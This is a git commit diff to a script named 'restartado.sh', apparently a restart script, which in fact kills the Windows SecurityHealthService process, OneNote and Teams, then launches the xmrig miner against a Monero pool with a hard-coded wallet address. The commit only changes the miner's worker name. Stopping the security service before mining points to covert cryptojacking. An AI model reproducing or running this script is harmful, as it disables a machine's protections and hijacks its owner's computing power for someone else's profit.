7b0ab670842cb79f9abc2e0550f914ff4629a484
marinabarros320168 <121142741+marinabarros320168@users.noreply.github.com>
2023-01-05 15:00:01 -0300

    Update restartado.sh

--- restartado.sh
+++ restartado.sh
@@ -6,5 +6,5 @@ taskkill /IM SecurityHealthService.exe
 taskkill /IM ONENOTEM.exe
 taskkill /IM Teams.exe
 cd /d "%~dp0"
-xmrig.exe --coin=XMR -o xmr.2miners.com:2222 -u 8635LEjQNMTKA3itCDvKGujmHLgYn33hhjiX7uat5VKhi7WThxFw8t5C2mfaiaF86JHCPHWWTmHZwjEgVt9RNAyo7ueQgKW.ComRestart-05-01 -p x -t 8
+xmrig.exe --coin=XMR -o xmr.2miners.com:2222 -u 8635LEjQNMTKA3itCDvKGujmHLgYn33hhjiX7uat5VKhi7WThxFw8t5C2mfaiaF86JHCPHWWTmHZwjEgVt9RNAyo7ueQgKW.ComRestart-05-01_3 -p x -t 8
 pause 
